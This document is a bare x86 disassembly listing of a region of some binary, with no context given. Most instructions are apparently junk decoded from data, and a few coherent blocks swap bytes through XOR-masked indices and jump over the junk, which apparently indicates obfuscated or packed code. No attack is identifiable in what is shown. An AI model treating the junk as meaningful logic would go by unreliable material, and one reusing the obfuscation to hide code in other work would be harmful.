  404a41:	adc    edx,DWORD PTR [edx]
  404a43:	fwait
  404a44:	(bad)  
  404a45:	stos   DWORD PTR es:[edi],eax
  404a46:	cmp    eax,0xaf637b4e
  404a4b:	push   esi
  404a4c:	xor    DWORD PTR [ebp-0xead043c],0x52
  404a53:	push   eax
  404a54:	pushf  
  404a55:	int    0x2a
  404a57:	and    BYTE PTR [esi+0x57c57274],dh
  404a5d:	mov    esp,0xa6143c6c
  404a62:	lods   eax,DWORD PTR ds:[esi]
  404a63:	jle    0x4049fa
  404a65:	sub    edi,eax
  404a67:	call   0x70d1:0x5f36a0f4
  404a6e:	mov    cl,0xb4
  404a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a71:	cwde   
  404a72:	sbb    edi,eax
  404a74:	push   ss
  404a75:	(bad)  
  404a76:	outs   dx,DWORD PTR ds:[esi]
  404a77:	sub    BYTE PTR [edi-0x4b],bh
  404a7a:	adc    BYTE PTR [edx],ah
  404a7c:	xor    al,ah
  404a7e:	sbb    edi,DWORD PTR [edx+0x63]
  404a81:	test   DWORD PTR [ebp+0x70f31c1a],esi
  404a87:	mov    bl,0x5
  404a89:	repz out 0x4a,eax
  404a8c:	jmp    0x404a48
  404a8e:	push   0xffffffe8
  404a90:	dec    ecx
  404a91:	stos   DWORD PTR es:[edi],eax
  404a92:	pop    es
  404a93:	mov    al,ds:0x90ec9e5d
  404a98:	lds    eax,FWORD PTR [edi]
  404a9a:	sbb    eax,0xccd05f2d
  404a9f:	and    al,0xc6
  404aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aa2:	ret    
  404aa3:	cmp    al,0x77
  404aa5:	push   ebx
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xc03c6a28
  404b32:	icebp  
  404b33:	loop   0x404b00
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b07
  404b3e:	xchg   esi,eax
  404b3f:	fwait
  404b40:	pop    ebx
  404b41:	gs dec edi
  404b43:	scas   eax,DWORD PTR es:[edi]
  404b44:	pusha  
  404b45:	jmp    0x404b10
  404b47:	mov    ah,0xdf
  404b49:	mov    ebp,DWORD PTR [edx-0x279b5279]
  404b4f:	jbe    0x404bb8
  404b51:	sbb    eax,0xffffffd5
  404b54:	mov    bh,0x3b
  404b56:	xchg   esi,eax
  404b57:	and    ebx,esp
  404b59:	jmp    0xd8d4e13c
  404b5e:	xor    edx,DWORD PTR [edx]
  404b60:	bound  ebx,QWORD PTR [eax+0x7b]
  404b63:	inc    ebx
  404b64:	adc    BYTE PTR [ecx],dh
  404b66:	std    
  404b67:	and    DWORD PTR [edi+0xf0b68b7],0x26
  404b6e:	inc    esi
  404b6f:	cmp    DWORD PTR [eax],esi
  404b71:	ins    BYTE PTR es:[edi],dx
  404b72:	push   edi
  404b73:	mov    ebx,eax
  404b75:	cld    
  404b76:	sbb    BYTE PTR [esi-0x9],dl
  404b79:	jnp    0x404bd5
  404b7b:	push   ss
  404b7c:	mov    esi,0xf2c1d51a
  404b81:	scas   al,BYTE PTR es:[edi]
  404b82:	jg     0x404b9e
  404b84:	dec    eax
  404b85:	stos   DWORD PTR es:[edi],eax
  404b86:	jmp    0x404bb4
  404b88:	in     eax,dx
  404b89:	fnstsw WORD PTR [ecx+edi*4+0x1b]
  404b8d:	je     0x404b28
  404b8f:	dec    esi
  404b90:	cli    
  404b91:	and    DWORD PTR [eax+0x15],edi
  404b94:	xor    DWORD PTR [edx],edx
  404b96:	mov    al,0x16
  404b98:	ins    BYTE PTR es:[edi],dx
  404b99:	push   cs
  404b9a:	arpl   WORD PTR [ebx+0x58b3df4d],bp
  404ba0:	jns    0x404b4e
  404ba2:	mov    ebx,0x32f96b83
  404ba7:	ds in  al,dx
  404ba9:	out    0x14,al
  404bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bac:	push   ebp
  404bad:	jmp    0x42d8:0xcbe0d7fd
  404bb4:	pop    ecx
  404bb5:	jne    0x404b88
  404bb7:	mov    WORD PTR [ecx],ds
  404bb9:	loop   0x404b3b
  404bbb:	jne    0x404bfa
  404bbd:	leave  
  404bbe:	dec    esi
  404bbf:	push   edx
  404bc0:	rcr    esi,cl
  404bc2:	cmp    eax,0x6567eb43
  404bc7:	je     0x404b61
  404bc9:	xchg   esi,eax
  404bca:	pop    esp
  404bcb:	mov    al,gs:0x881d588e
  404bd1:	and    eax,0xa8eeba9a
  404bd6:	mov    ah,0xaf
  404bd8:	out    0xc5,al
  404bda:	inc    eax
  404bdb:	push   0x55
  404bdd:	mov    bh,0x12
  404bdf:	xor    al,0xb
  404be1:	dec    ebp
  404be2:	pop    ebx
  404be3:	aad    0x4c
  404be5:	dec    esi
  404be6:	popa   
  404be7:	lods   eax,DWORD PTR ds:[esi]
  404be8:	add    eax,0xd753e521
  404bed:	ins    DWORD PTR es:[edi],dx
  404bee:	div    BYTE PTR [ebx+0x1b5dcc70]
  404bf4:	sub    eax,0x178774ee
  404bf9:	xor    ebp,DWORD PTR [edx+edi*2-0x8]
  404bfd:	xchg   edx,eax
  404bfe:	adc    eax,0x8172c26f
  404c03:	dec    ecx
  404c04:	leave  
  404c05:	lea    ebp,ds:0x8a28bc56
  404c0b:	mov    ecx,es
  404c0d:	sub    esi,eax
  404c0f:	mov    al,ds:0xb3741a8c
  404c14:	cmc    
  404c15:	mov    bl,0x9e
  404c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c18:	repz imul ebp,DWORD PTR [esi+0x79999ada],0x77
  404c20:	in     al,dx
  404c21:	sti    
  404c22:	shl    BYTE PTR [esi],cl
  404c24:	sub    al,0x48
  404c26:	clc    
  404c27:	xlat   BYTE PTR ds:[ebx]
  404c28:	adc    al,0x82
  404c2a:	je     0x404c73
  404c2c:	xor    DWORD PTR [edi],0x533bdfe
  404c32:	scas   eax,DWORD PTR es:[edi]
  404c33:	inc    ebp
  404c34:	mov    WORD PTR [edx-0x4040b632],es
  404c3a:	cmp    DWORD PTR [ebx],ecx
  404c3c:	mov    fs,WORD PTR [ebx+0x1a709a20]
  404c42:	sar    BYTE PTR [esi],cl
  404c44:	dec    ebp
  404c45:	dec    ebx
  404c46:	fsub   st(2),st
  404c48:	sbb    cl,BYTE PTR [eax]
  404c4a:	aam    0x13
  404c4c:	push   eax
  404c4d:	or     eax,0x50372b48
  404c52:	mov    DWORD PTR [esi],ebp
  404c54:	imul   edi,ecx,0xe31fa991
  404c5a:	or     cl,BYTE PTR [ebx]
  404c5c:	arpl   WORD PTR [edx],si
  404c5e:	mov    ah,0x80
  404c60:	jmp    0x91b788a8
  404c65:	imul   ebx,eax,0x3632a05f
  404c6b:	jo     0x404ca5
  404c6d:	push   ecx
  404c6e:	pop    ebx
  404c6f:	sbb    al,0xf4
  404c71:	add    eax,0xac15ca7d
  404c76:	push   ss
  404c77:	mov    ds:0x341b899f,al
  404c7c:	hlt    
  404c7d:	out    0xbb,al
  404c7f:	fmul   DWORD PTR ds:0x975c7891
  404c85:	ret    
  404c86:	mov    bl,0xa
  404c88:	sti    
  404c89:	jmp    0x1fd1:0x6a0bcc5
  404c90:	inc    edi
  404c91:	(bad)  
  404c92:	jge    0x404d11
  404c94:	inc    ecx
  404c95:	jg     0x404c82
  404c97:	and    bh,bh
  404c99:	enter  0xa2b9,0xa2
  404c9d:	mov    al,0x98
  404c9f:	xor    dh,BYTE PTR [eax]
  404ca1:	jmp    0x9d0efd19
  404ca6:	push   0xe0766f9
  404cab:	add    ecx,DWORD PTR [eax-0x15456e85]
  404cb1:	cmp    DWORD PTR [edx-0x31],esi
  404cb4:	(bad)  
  404cb5:	mov    bl,0xba
  404cb7:	mov    ebp,0x71a1ed21
  404cbc:	sub    al,0x59
  404cbe:	dec    ebx
  404cbf:	xchg   DWORD PTR [ebx+0x47],esp
  404cc2:	in     eax,dx
  404cc3:	pop    ds
  404cc4:	fmul   st(2),st
  404cc6:	(bad)  
  404cc8:	rcr    dh,cl
  404cca:	dec    ebx
  404ccb:	xchg   DWORD PTR [esi+ebp*4-0x1e],ebp
  404ccf:	(bad)  
  404cd0:	cmp    al,0xe5
  404cd2:	js     0x404d21
  404cd4:	aaa    
  404cd5:	in     eax,dx
  404cd6:	jb     0x404ce5
  404cd8:	cmp    edx,DWORD PTR [ecx-0x73]
  404cdb:	jnp    0x404d3c
  404cdd:	push   cs
  404cde:	push   cs
  404cdf:	repz push eax
  404ce1:	imul   esp,DWORD PTR [ebx-0x40],0x3b36c2f3
  404ce8:	ret    
  404ce9:	xor    eax,0xab2da55a
  404cee:	arpl   cx,ax
  404cf0:	gs dec ebx
  404cf2:	les    edx,FWORD PTR [eax+0x2b23c3be]
  404cf8:	dec    ecx
  404cf9:	mov    ch,0xe3
  404cfb:	test   BYTE PTR [esi-0x43db0263],0xcb
  404d02:	and    edx,DWORD PTR [edi-0x1ecb8de6]
  404d08:	add    DWORD PTR [ebx],0xffffff99
  404d0b:	pop    ebx
  404d0c:	jb     0x404d72
  404d0e:	pop    esi
  404d0f:	inc    edi
  404d10:	out    dx,al
  404d11:	jmp    0x404cfd
  404d13:	sub    al,0x43
  404d15:	sbb    DWORD PTR [ecx+0x4f],edx
  404d18:	push   eax
  404d19:	xor    DWORD PTR ds:0x4bd297a6,ebx
  404d1f:	ins    BYTE PTR es:[edi],dx
  404d20:	sbb    cl,BYTE PTR [ebp+0x27]
  404d23:	pop    ecx
  404d24:	sub    eax,0xbc5b3c9d
  404d29:	neg    BYTE PTR [edx-0x16]
  404d2c:	sub    al,0xe3
  404d2e:	test   al,0x20
  404d30:	jb     0x404d1f
  404d32:	(bad)  
  404d33:	jge    0x404d26
  404d35:	xor    al,0xc2
  404d37:	outs   dx,BYTE PTR ds:[esi]
  404d38:	sti    
  404d39:	pop    ds
  404d3a:	loop   0x404d09
  404d3c:	or     al,0xd4
  404d3e:	cld    
  404d3f:	aam    0x5e
  404d41:	xchg   BYTE PTR [edi+0x3f],bl
  404d44:	xor    BYTE PTR [esi],cl
  404d46:	jo     0x404d7d
  404d48:	fidivr DWORD PTR [ecx+0x36833b83]
  404d4e:	dec    ebx
  404d4f:	push   ds
  404d50:	push   ss
  404d51:	nop    edi
  404d54:	jne    0x404dbc
  404d56:	in     al,0x48
  404d58:	ret    0x4623
  404d5b:	push   ecx
  404d5c:	cmp    eax,0xae91a62
  404d61:	ja     0x404d2d
  404d63:	xor    al,0x23
  404d65:	idiv   edx
  404d67:	aad    0x85
  404d69:	pushf  
  404d6a:	ins    DWORD PTR es:[edi],dx
  404d6b:	das    
  404d6c:	mov    esp,0xd29af19b
  404d71:	retf   
  404d72:	jb     0x404d25
  404d74:	ds sbb eax,0x94cb1977
  404d7a:	mov    ecx,DWORD PTR [eax+edx*1+0x4f]
  404d7e:	pop    ecx
  404d7f:	mov    dl,0xc6
  404d81:	mov    BYTE PTR [ebx],bl
  404d83:	lds    ebp,FWORD PTR [eax+0x17c28ef1]
  404d89:	leave  
  404d8a:	stc    
  404d8b:	pop    edi
  404d8c:	and    dh,BYTE PTR [ebx]
  404d8e:	push   edi
  404d8f:	pop    ss
  404d90:	xchg   DWORD PTR [edi],eax
  404d92:	or     ecx,edi
  404d94:	pop    esi
  404d95:	sub    BYTE PTR [ebx-0x139cece4],0x38
  404d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d9d:	daa    
  404d9e:	int    0xa1
  404da0:	ins    BYTE PTR es:[edi],dx
  404da1:	lea    ecx,[ebp+0x3a]
  404da4:	sbb    DWORD PTR [edi+0xa9bfb1b],ecx
  404daa:	inc    ecx
  404dab:	pushf  
  404dac:	inc    edx
  404dad:	mov    dl,bl
  404daf:	jns    0x404de8
  404db1:	loop   0x404d6b
  404db3:	sub    eax,0x32f4093a
  404db8:	stos   DWORD PTR es:[edi],eax
  404db9:	(bad)  
  404dba:	fucom  st(5)
  404dbc:	test   al,0x7d
  404dbe:	jb     0x404e3e
  404dc0:	cmp    esp,esp
  404dc2:	scas   eax,DWORD PTR es:[edi]
  404dc3:	popf   
  404dc4:	xor    al,0xd
  404dc6:	scas   al,BYTE PTR es:[edi]
  404dc7:	jmp    0x3c5e91a6
  404dcc:	mov    bl,0x89
  404dce:	dec    eax
  404dcf:	jmp    FWORD PTR [ebp+0x7e1accb6]
  404dd5:	dec    esp
  404dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dd7:	mul    cl
  404dd9:	in     al,dx
  404dda:	scas   eax,DWORD PTR es:[edi]
  404ddb:	xchg   ecx,eax
  404ddc:	pop    edx
  404ddd:	ins    BYTE PTR es:[edi],dx
  404dde:	in     al,dx
  404ddf:	mov    ds:0xc6ced6d4,al
  404de4:	loopne 0x404de5
  404de6:	push   cs
  404de7:	sub    BYTE PTR [ecx-0x9e5266a],ah
  404ded:	push   ds
  404dee:	sbb    al,0xdb
  404df0:	and    ebp,DWORD PTR [eax-0x7ee6f2a7]
  404df6:	mov    bl,0x3f
  404df8:	jmp    0x7c120af9
  404dfd:	pop    esi
  404dfe:	push   DWORD PTR [ebp-0x18]
  404e01:	loopne 0x404d99
  404e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e04:	inc    esp
  404e05:	sbb    BYTE PTR [eax],ah
  404e07:	pop    ds
  404e08:	pop    ecx
  404e09:	(bad)  
  404e0b:	xchg   edx,eax
  404e0c:	and    eax,0x734dcce9
  404e11:	pop    ss
  404e12:	aas    
  404e13:	cmp    al,ch
  404e15:	add    dh,0xe5
  404e18:	mov    ds:0x43c7fec1,al
  404e1d:	scas   eax,DWORD PTR es:[edi]
  404e1e:	mov    bh,0x13
  404e20:	xor    eax,0xf9037b80
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e7a
  404e5e:	in     al,0x33
  404e60:	mov    al,ds:0x7e7e218c
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e92
  404e6a:	outs   dx,BYTE PTR ds:[esi]
  404e6b:	xchg   ebx,edx
  404e6d:	lods   al,BYTE PTR ds:[esi]
  404e6e:	cli    
  404e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e70:	adc    bh,al
  404e72:	xchg   ebp,eax
  404e73:	jae    0x404e12
  404e75:	lods   al,BYTE PTR ds:[esi]
  404e76:	add    ch,BYTE PTR [edi+ebp*1-0x46]
  404e7a:	mov    ebp,gs
  404e7c:	push   0xffffffd2
  404e7e:	sub    edi,DWORD PTR [eax]
  404e80:	cli    
  404e81:	mov    bl,0x9e
  404e83:	mov    ds:0x3a4a538f,eax
  404e88:	mov    WORD PTR es:[esp+ebx*1+0x5d],cs
  404e8d:	nop
  404e8e:	add    eax,0xb6a8be57
  404e93:	leave  
  404e94:	in     eax,dx
  404e95:	or     ecx,edx
  404e97:	sahf   
  404e98:	das    
  404e99:	repnz (bad) 
  404e9b:	(bad)  
  404e9c:	and    bl,BYTE PTR [ecx]
  404e9e:	xchg   ebp,eax
  404e9f:	icebp  
  404ea0:	bound  edx,QWORD PTR [ecx+0x64]
  404ea3:	iret   
  404ea4:	inc    eax
  404ea5:	mov    ecx,0x29a2af38
  404eaa:	mov    ah,0x78
  404eac:	das    
  404ead:	leave  
  404eae:	or     esi,DWORD PTR ds:0xce3a8b1f
  404eb4:	call   bx
  404eb7:	jg     0x404e85
  404eb9:	icebp  
  404eba:	push   ecx
  404ebb:	aam    0xd8
  404ebd:	iret   
  404ebe:	fdivr  DWORD PTR [eax-0x67]
  404ec1:	call   0x8c1f:0x87c5eed6
  404ec8:	repnz mov ebp,0x3766052c
  404ece:	and    BYTE PTR [esi+ecx*8+0x65],0x4c
  404ed3:	je     0x404eed
  404ed5:	push   ss
  404ed6:	pushf  
  404ed7:	xor    eax,0xd5866e4
  404edc:	dec    esi
  404edd:	jo     0x404e61
  404edf:	cmp    ebp,DWORD PTR [ebp+0x4c1cf0d1]
  404ee5:	sub    DWORD PTR [ebx+0x1d],esp
  404ee8:	xor    edi,esp
  404eea:	xchg   ecx,eax
  404eeb:	lock dec ebx
  404eed:	jg     0x404edc
  404eef:	add    eax,0x342c61e7
  404ef4:	sub    ch,0xa8
  404ef7:	js     0x404f17
  404ef9:	jno    0x404f1a
  404efb:	shl    DWORD PTR [bp-0x3e79],0x81
  404f01:	pop    esp
  404f02:	push   edx
  404f03:	int3   
  404f04:	stos   DWORD PTR es:[edi],eax
  404f05:	call   0xd9c0:0xeeb478e8
  404f0c:	icebp  
  404f0d:	out    dx,eax
  404f0e:	push   eax
  404f0f:	and    BYTE PTR [ebp+0x74],ah
  404f12:	mov    ebp,0x5d4e5708
  404f17:	cmc    
  404f18:	dec    ecx
  404f19:	xor    edi,edi
  404f1b:	imul   edi,DWORD PTR [ecx],0xc045de95
  404f21:	xlat   BYTE PTR ds:[ebx]
  404f22:	dec    ebx
  404f23:	add    al,0xe0
  404f25:	iret   
  404f26:	daa    
  404f27:	cdq    
  404f28:	and    BYTE PTR [esi+0x1aa57c65],bh
  404f2e:	mov    edx,0x7d31ca39
  404f33:	mov    eax,ds:0xe8a73438
  404f38:	fcomp  DWORD PTR [ebx-0x4b]
  404f3b:	xor    al,0xc
  404f3d:	(bad)  [esi+0x27]
  404f40:	pop    esp
  404f41:	jp     0x404fb9
  404f43:	scas   eax,DWORD PTR es:[edi]
  404f44:	xlat   BYTE PTR ds:[ebx]
  404f45:	mov    ah,0xc6
  404f47:	jno    0x404fa0
  404f49:	int    0x98
  404f4b:	and    BYTE PTR [ecx],0x90
  404f4e:	dec    ecx
  404f4f:	fisub  WORD PTR [ecx-0x59]
  404f52:	(bad)  
  404f53:	test   eax,0x88b6b07a
  404f58:	dec    edx
  404f59:	dec    esi
  404f5a:	add    BYTE PTR [ebx],0xa0
  404f5d:	(bad)  
  404f5e:	and    BYTE PTR [ecx+0x5a],dl
  404f61:	imul   eax,DWORD PTR ds:0x745bf885,0x376d95f6
  404f6b:	ins    BYTE PTR es:[edi],dx
  404f6c:	jge    0x404fa2
  404f6e:	and    al,0x4e
  404f70:	test   edx,eax
  404f72:	mov    al,ds:0xf41d73a3
  404f77:	fisttp QWORD PTR [ecx]
  404f79:	sub    BYTE PTR [ebp+0x6a99ac7c],dh
  404f7f:	cmp    eax,0xb746d983
  404f84:	mov    ds:0x82e729a1,eax
  404f89:	xor    al,0x40
  404f8b:	les    ebp,FWORD PTR [ebx-0x38e7920b]
  404f91:	pop    ebp
  404f92:	and    edi,DWORD PTR [edx]
  404f94:	iret   
  404f95:	jp     0x404fdb
  404f97:	push   sp
  404f99:	add    bh,BYTE PTR [ebx]
  404f9b:	xchg   esp,eax
  404f9c:	out    dx,eax
  404f9d:	xchg   ebp,eax
  404f9e:	xor    al,0xaa
  404fa0:	xlat   BYTE PTR ds:[ebx]
  404fa1:	sub    BYTE PTR [ecx+0x3a3b5d1d],bl
  404fa7:	shl    DWORD PTR [ebp+0x36085123],1
  404fad:	sahf   
  404fae:	xchg   edx,eax
  404faf:	mov    ch,0x4
  404fb1:	add    eax,0x1f4dec69
  404fb6:	sub    BYTE PTR [bp+si-0x44f0],al
  404fbb:	xchg   edi,eax
  404fbc:	push   cs
  404fbd:	jae    0x404f9d
  404fbf:	mov    dh,0xdb
  404fc1:	mov    BYTE PTR [esi+0x564cd3c5],dl
  404fc7:	loope  0x404f99
  404fc9:	mov    eax,0x2e34ad3
  404fce:	inc    ebx
  404fcf:	loope  0x404fd8
  404fd1:	inc    ebp
  404fd2:	bound  ebx,QWORD PTR [esi-0x1224a657]
  404fd8:	fld    DWORD PTR [ebx]
  404fda:	mov    esi,0xa0a58640
  404fdf:	push   ds
  404fe0:	jg     0x405006
  404fe2:	dec    esi
  404fe3:	leave  
  404fe4:	push   edx
  404fe5:	int3   
  404fe6:	std    
  404fe7:	sbb    BYTE PTR [edx+eiz*1],dh
  404fea:	ror    DWORD PTR [edi],0x30
  404fed:	adc    DWORD PTR [eax-0x4],0xb0b8daf9
  404ff4:	aam    0xf4
  404ff6:	data16 out 0x6d,al
  404ff9:	repz jns 0x405031
  404ffc:	adc    BYTE PTR [edi-0x6c38bf70],dl
  405002:	adc    BYTE PTR [edx-0xe],bh
  405005:	fpatan 
  405007:	adc    BYTE PTR [edx+0x14],cl
  40500a:	imul   esp,DWORD PTR [edi-0x6a2e1479],0xf0816e27
  405014:	mov    WORD PTR [edi],ds
  405016:	jns    0x405042
  405018:	(bad)  
  405019:	jmp    0x83167068
  40501e:	inc    esp
  40501f:	addr16 gs std 
  405022:	retf   
  405023:	push   ss
  405024:	mov    esi,0xb679cdb0
  405029:	jge    0x405058
  40502b:	dec    edi
  40502c:	stos   DWORD PTR es:[edi],eax
  40502d:	push   ebx
  40502e:	push   es
  40502f:	test   al,0xa7
  405031:	(bad)  
  405032:	xlat   BYTE PTR ds:[ebx]
  405033:	add    eax,0x2e81b1d6
  405038:	sbb    ebp,ebx
  40503a:	jg     0x405089
  40503c:	hlt    
  40503d:	ins    BYTE PTR es:[edi],dx
  40503e:	push   0xffffffb1
  405040:	out    dx,eax
  405041:	loope  0x405010
  405043:	nop
  405044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405045:	cmc    
  405046:	adc    ebp,DWORD PTR [ecx*2-0x22abbc1e]
  40504d:	arpl   bp,bp
  40504f:	mov    ecx,DWORD PTR [ecx+esi*1]
  405052:	jp     0x405096
  405054:	test   al,0x40
  405056:	fistp  QWORD PTR [edx+ebx*2-0x53]
  40505a:	addr16 gs jg 0x4050bb
  40505e:	jno    0x4050db
  405060:	or     eax,0xd51edc09
  405065:	(bad)  
  405066:	std    
  405067:	test   esi,edx
  405069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40506a:	cmp    BYTE PTR [ebx+eax*4-0x60e8a7b2],bh
  405071:	push   ebx
  405072:	dec    edx
  405073:	int    0x40
  405075:	ins    BYTE PTR es:[edi],dx
  405076:	push   ds
  405077:	xchg   esp,eax
  405078:	(bad)  
  405079:	stc    
  40507a:	in     eax,0x83
  40507c:	mov    BYTE PTR ss:[ebx-0x2],al
  405080:	les    edx,FWORD PTR [ecx-0x7a]
  405083:	sub    BYTE PTR [esi+0x654e25f],ch
  405089:	sbb    eax,DWORD PTR [ebp-0x44]
  40508c:	(bad)  
  40508d:	sqrtps xmm1,XMMWORD PTR [edx+0x14]
  405091:	cli    
  405092:	(bad)  
  405093:	imul   esp,DWORD PTR [edx-0x10],0xd2728e96
  40509a:	push   ss
  40509b:	inc    ebx
  40509c:	mov    ds:0x9961c6b3,eax
  4050a1:	repz or esp,edx
  4050a4:	cmp    dl,dh
  4050a6:	or     eax,0xffffffe2
  4050a9:	int3   
  4050aa:	bound  eax,QWORD PTR [esi-0x15]
  4050ad:	je     0x40506f
  4050af:	pop    eax
  4050b0:	jecxz  0x405112
  4050b2:	pusha  
  4050b3:	sbb    DWORD PTR [edi],0x52
  4050b6:	sbb    eax,0xa507f550
  4050bb:	sti    
  4050bc:	xor    DWORD PTR [esi+edi*4],esi
  4050bf:	ret    
  4050c0:	dec    ebx
  4050c1:	sub    DWORD PTR ds:0xb3fa428f,0x40e6220c
  4050cb:	jp     0x40510d
  4050cd:	sbb    al,0xcb
  4050cf:	xor    esp,ebp
  4050d1:	dec    ebx
  4050d2:	aas    
  4050d3:	inc    edi
  4050d4:	icebp  
  4050d5:	mov    al,0xd4
  4050d7:	cmp    al,0x2f
  4050d9:	xor    bh,BYTE PTR [edx-0x8]
  4050dc:	jnp    0x4050bc
  4050de:	es (bad) 
  4050e0:	adc    ecx,edx
  4050e2:	mov    al,0x7e
  4050e4:	fsubr  QWORD PTR [ebp+0x380e62f]
  4050ea:	jg     0x40510c
  4050ec:	mov    bh,0xb0
  4050ee:	dec    edx
  4050ef:	xor    dl,BYTE PTR [ecx]
  4050f1:	les    ebx,FWORD PTR [ecx-0xb1e38d]
  4050f7:	fsub   st(7),st
  4050f9:	xlat   BYTE PTR ds:[ebx]
  4050fa:	add    eax,0xa6da6486
  4050ff:	ins    DWORD PTR es:[edi],dx
  405100:	ins    BYTE PTR es:[edi],dx
  405101:	(bad)  
  405102:	mov    esi,0x164a701d
  405107:	fnstcw WORD PTR [esi-0x4f677854]
  40510d:	ja     0x4050e0
  40510f:	cmp    edi,esp
  405111:	jae    0x4050f5
  405113:	sub    BYTE PTR [edx+0x40736488],dh
  405119:	test   al,0x7f
  40511b:	int3   
  40511c:	fisttp WORD PTR [eax+0x7f]
  40511f:	sbb    dh,BYTE PTR [ebp+0x2afdfb1e]
  405125:	lods   eax,DWORD PTR ds:[esi]
  405126:	(bad)  
  405127:	adc    bh,BYTE PTR [edx+0x1a8a4808]
  40512d:	jmp    0x4050f4
  40512f:	out    0x19,al
  405131:	pop    esp
  405132:	xchg   BYTE PTR [ecx+0x21f0a6ef],bl
  405138:	imul   ecx,DWORD PTR [esi-0x63],0xf6f93a50
  40513f:	add    DWORD PTR [eax+0xfff003f],ebx
  405145:	mov    eax,ds:0x7972cdae
  40514a:	inc    esp
  40514b:	adc    eax,0xf47f0bd
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	sbb    bl,BYTE PTR [edi]
  405173:	dec    ebp
  405174:	xchg   edi,eax
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051fb
  40517e:	lods   eax,DWORD PTR ds:[esi]
  40517f:	inc    ebx
  405180:	or     al,0x6e
  405182:	or     ch,BYTE PTR [ebx+0x41cf7869]
  405188:	adc    cl,cl
  40518a:	mov    dl,BYTE PTR [esi+0x788e26b9]
  405190:	arpl   WORD PTR [bp+si],si
  405193:	mov    bh,0x5e
  405195:	sahf   
  405196:	sbb    BYTE PTR [esi],dh
  405198:	aaa    
  405199:	add    al,0x62
  40519b:	repnz repz shl BYTE PTR [edx-0x3cf2c47c],0xd5
  4051a4:	mov    eax,0xfe2708d4
  4051a9:	push   ss
  4051aa:	(bad)  
  4051ab:	popf   
  4051ac:	and    bl,BYTE PTR [esp+edx*2+0x57f1d944]
  4051b3:	in     al,dx
  4051b4:	mov    edi,edx
  4051b6:	add    BYTE PTR [ebp-0x5d875e10],al
  4051bc:	fidiv  DWORD PTR [eax]
  4051be:	mov    esi,edx
  4051c0:	sbb    al,BYTE PTR [esi+0x7dd9ab3d]
  4051c6:	cmp    ecx,DWORD PTR [ebx]
  4051c8:	imul   ebp,edx,0xc
  4051cb:	push   edx
  4051cc:	sub    esi,DWORD PTR [ebp+0x72]
  4051cf:	clc    
